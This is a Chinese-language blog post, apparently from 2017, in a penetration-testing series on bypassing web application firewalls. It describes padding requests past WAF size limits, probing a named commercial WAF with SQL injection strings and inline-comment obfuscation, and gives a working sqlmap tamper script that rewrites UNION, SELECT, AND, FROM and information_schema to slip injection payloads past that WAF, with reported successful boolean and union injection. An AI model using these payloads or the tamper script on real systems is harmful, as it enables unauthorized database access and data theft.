<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>渗透测试中的Bypass技巧（三）自动化注入 - 倾旋的博客</title><meta name=theme-color><meta name=description content="0x00 匹配资源大小限制
某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。
Get方法提交的数据大小长度并没有限制，HTTP协议规范没有对URL长度进行限制。这个限制是特定的浏览器及服务器对它的限制。可见WAF可能在处理GET请求的时候，根据客户端（浏览器）规定的长度去匹配了，这就造成了一个缺陷。我们可以把有效数据放在这个限制的零界点，攻击语句放在零界点后方，让WAF以为这是一个正常请求，就随之放行，达到了攻击效果。
理论上讲，POST是没有大小限制的。HTTP协议规范也没有进行大小限制，起限制作用的是服务器的处理程序的处理能力。
例如在使用PHP进行POST提交时，文件大小受PHP配置文件PHP.INI限制，我们可以修改PHP.INI文件中的post_max_size参数，可将默认的2M字节，修改自己需要的大小，但由于HTTP协议的特性，这个值不宜设置过大，最大以8M为宜。假设如果服务器端设置了8M，而WAF默认只匹配2M，由此可见服务器端接受数据的大小>WAF匹配的数据最大大小。那么，我们可以根据上述方法，也可绕过WAF的拦截。
0x01 绕过某WAF上传
渗透测试中的Bypass技巧（二） - 知乎专栏
在上一章中我们已经举例了一个bypass上传，最重要的彩蛋就在Bypass注入啦~
0x02 绕过某WAF注入
我们构造一个SQL注入页面，慢慢去研究它的拦截规则：

先从普通的语句开始做定位：


and 1=1


and ‘s’=’s’


union select 1,2,3


union/**/select/**/user(),2,3


&mldr;&mldr;


等价替换


And ‘s’ like ‘s’


此时我们已经可以使用like用于盲注（此时可以将所有的 = 替换成 Like ）

注释
我们可以设想出拦截的特征正则
union与select同时出现会被拦截，union[空格,%20,/*部分字符*/]select都会被拦截，目前普通的union select都会被拦截，既然空格,%20都会被匹配到，我们只能通过/**/内联来注释了（目前发现N多姿势，在这里只共享思路+一个bypass的tamper脚本）


/**/


/*数字+字母*/


/*特殊符号+数字+字母*/


&mldr;..more


假设union左右如果有select就拦截的话，那么定位union与select之间的敏感字符就好，假设union[空格]select，此时如果把空格替换成任意内联，就可bypass这个规则，此时规则也不可能是一条的。条件也是很多的。我们也只能讲内联这个规则做手脚了。
于是乎我发现/*^xxx^xxx*/字母加特殊字符即可bypass。
因为每个特征中都没有匹配到^与小写字母、大写字母、数字的组合，这些条件可以继续测试，笔者已经把此文写到最佳精简，测试期间也翻看过拦截日志，定位拦截特征。
（Union注入）例如在读取：mysql密码、表名的时候，我们还会查询information_schema数据库，这个可以转换大小写，或者在information_schema.TABLES直接再添加一个注释。下面就是测试过程：首先测试简单的and 1=1

然后我们使用注释bypass:

此时已经bypass成功了，我在这里用的是某dog 4.0（3.5也可以）

0x03 自动化bypass注入
我们通过编写sqlmap的tamper用于bypass，主要是需要定位各种拦截点，使用sqlmap替换Payload。
首先在sqlmap的tamper文件夹里创建一个safedog.py，编写我们的tamper脚本
"><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="渗透测试中的Bypass技巧（三）自动化注入"><meta itemprop=description content="某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。"><meta itemprop=datePublished content="2017-03-07T00:00:00+00:00"><meta itemprop=dateModified content="2017-03-07T00:00:00+00:00"><meta itemprop=wordCount content="100"><meta property="og:url" content="https://payloads.online/archivers/2017-03-10/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="渗透测试中的Bypass技巧（三）自动化注入"><meta property="og:description" content="某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2017-03-07T00:00:00+00:00"><meta property="article:modified_time" content="2017-03-07T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="渗透测试中的Bypass技巧（三）自动化注入"><meta name=twitter:description content="某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。"><link rel=canonical href=https://payloads.online/archivers/2017-03-10/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">渗透测试中的Bypass技巧（三）自动化注入</h1><div class="text-xs antialiased opacity-60"><time>Mar 7, 2017</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><h2 id=0x00-匹配资源大小限制>0x00 匹配资源大小限制</h2><p>某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。</p><p>Get方法提交的数据大小长度并没有限制，HTTP协议规范没有对URL长度进行限制。这个限制是特定的浏览器及服务器对它的限制。可见WAF可能在处理GET请求的时候，根据客户端（浏览器）规定的长度去匹配了，这就造成了一个缺陷。我们可以把有效数据放在这个限制的零界点，攻击语句放在零界点后方，让WAF以为这是一个正常请求，就随之放行，达到了攻击效果。</p><p>理论上讲，POST是没有大小限制的。HTTP协议规范也没有进行大小限制，起限制作用的是服务器的处理程序的处理能力。</p><p>例如在使用PHP进行POST提交时，文件大小受PHP配置文件PHP.INI限制，我们可以修改PHP.INI文件中的post_max_size参数，可将默认的2M字节，修改自己需要的大小，但由于HTTP协议的特性，这个值不宜设置过大，最大以8M为宜。假设如果服务器端设置了8M，而WAF默认只匹配2M，由此可见服务器端接受数据的大小>WAF匹配的数据最大大小。那么，我们可以根据上述方法，也可绕过WAF的拦截。</p><h2 id=0x01-绕过某waf上传>0x01 绕过某WAF上传</h2><p>渗透测试中的Bypass技巧（二） - 知乎专栏</p><p>在上一章中我们已经举例了一个bypass上传，最重要的彩蛋就在Bypass注入啦~</p><h2 id=0x02-绕过某waf注入>0x02 绕过某WAF注入</h2><p>我们构造一个SQL注入页面，慢慢去研究它的拦截规则：</p><p><img src=https://images.payloads.online/d6591cea-4f5e-11ec-9ece-00d861bf4abb.jpg alt="enter description here"></p><p>先从普通的语句开始做定位：</p><ul><li><p>and 1=1</p></li><li><p>and ‘s’=’s’</p></li><li><p>union select 1,2,3</p></li><li><p><code>union/**/select/**/user(),2,3</code></p></li><li><p>&mldr;&mldr;</p></li><li><p>等价替换</p></li><li><p>And ‘s’ like ‘s’</p></li></ul><p>此时我们已经可以使用like用于盲注（此时可以将所有的 = 替换成 Like ）</p><p><img src=https://images.payloads.online/d6a4edbe-4f5e-11ec-82b2-00d861bf4abb.jpg alt="enter description here"></p><h3 id=注释>注释</h3><p>我们可以设想出拦截的特征正则</p><p>union与select同时出现会被拦截，union[空格,%20,/*部分字符*/]select都会被拦截，目前普通的union select都会被拦截，既然空格,%20都会被匹配到，我们只能通过/**/内联来注释了（目前发现N多姿势，在这里只共享思路+一个bypass的tamper脚本）</p><ul><li><p><code>/**/</code></p></li><li><p><code>/*数字+字母*/</code></p></li><li><p><code>/*特殊符号+数字+字母*/</code></p></li><li><p>&mldr;..more</p></li></ul><p>假设union左右如果有select就拦截的话，那么定位union与select之间的敏感字符就好，假设union<code>[空格]</code>select，此时如果把空格替换成任意内联，就可bypass这个规则，此时规则也不可能是一条的。条件也是很多的。我们也只能讲内联这个规则做手脚了。</p><p>于是乎我发现<code>/*^xxx^xxx*/</code>字母加特殊字符即可bypass。</p><p>因为每个特征中都没有匹配到^与小写字母、大写字母、数字的组合，这些条件可以继续测试，笔者已经把此文写到最佳精简，测试期间也翻看过拦截日志，定位拦截特征。</p><p>（Union注入）例如在读取：mysql密码、表名的时候，我们还会查询information_schema数据库，这个可以转换大小写，或者在information_schema.TABLES直接再添加一个注释。下面就是测试过程：首先测试简单的and 1=1</p><p><img src=https://images.payloads.online/d6ea58ea-4f5e-11ec-924c-00d861bf4abb.jpg alt="enter description here"></p><p>然后我们使用注释bypass:</p><p><img src=https://images.payloads.online/d72ef748-4f5e-11ec-9570-00d861bf4abb.jpg alt="enter description here"></p><p>此时已经bypass成功了，我在这里用的是某dog 4.0（3.5也可以）</p><p><img src=https://images.payloads.online/d773335e-4f5e-11ec-ba40-00d861bf4abb.jpg alt="enter description here"></p><h2 id=0x03-自动化bypass注入>0x03 自动化bypass注入</h2><p>我们通过编写sqlmap的tamper用于bypass，主要是需要定位各种拦截点，使用sqlmap替换Payload。</p><p>首先在sqlmap的tamper文件夹里创建一个safedog.py，编写我们的tamper脚本</p><p><img src=https://images.payloads.online/d7beadfc-4f5e-11ec-8261-00d861bf4abb.jpg alt="enter description here"></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> lib.core.enums <span style=color:#f92672>import</span> PRIORITY
</span></span><span style=display:flex><span>__priority__ <span style=color:#f92672>=</span> PRIORITY<span style=color:#f92672>.</span>LOW
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>tamper</span>(payload):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> payload:
</span></span><span style=display:flex><span>		bypass_SafeDog_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/*x^x*/&#34;</span>
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;UNION&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;UNION&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;SELECT&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;SELECT&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;AND&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;AND&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;=&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;=&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34; &#34;</span>,bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;information_schema.&#34;</span>,<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20/*!</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20INFOrMATION_SCHEMa</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20*/</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/&#34;</span>)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;FROM&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;FROM&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		<span style=color:#75715e>#print &#34;[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version .&#34;</span>
</span></span><span style=display:flex><span>		print payload
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
</span></span></code></pre></div><p>我们测试一下先不载入tamper脚本：</p><p><img src=https://images.payloads.online/d804cdf0-4f5e-11ec-9841-00d861bf4abb.jpg alt="enter description here"></p><p>到了这基本没戏了，我们看看拦截日志</p><p><img src=https://images.payloads.online/d858aa10-4f5e-11ec-890f-00d861bf4abb.jpg alt="enter description here"></p><p>现在载入tamper脚本：</p><p><img src=https://images.payloads.online/d8a9caee-4f5e-11ec-839d-00d861bf4abb.jpg alt="enter description here"></p><p>可以看到已经载入，并且识别了waf指纹。</p><p>以下是跑脚本的过程</p><p><img src=https://images.payloads.online/d90154bc-4f5e-11ec-a678-00d861bf4abb.jpg alt="enter description here"></p><p><img src=https://images.payloads.online/d94d48a4-4f5e-11ec-a123-00d861bf4abb.jpg alt="enter description here"></p><p>支持布尔值注入</p><p>支持union注入</p><p><img src=https://images.payloads.online/d99615f2-4f5e-11ec-b057-00d861bf4abb.jpg alt="enter description here"></p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2017-03-10/2/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>渗透测试中的Bypass技巧（四）自动化注入</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2017-03-06/1/><span>渗透测试中的Bypass技巧（二）</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>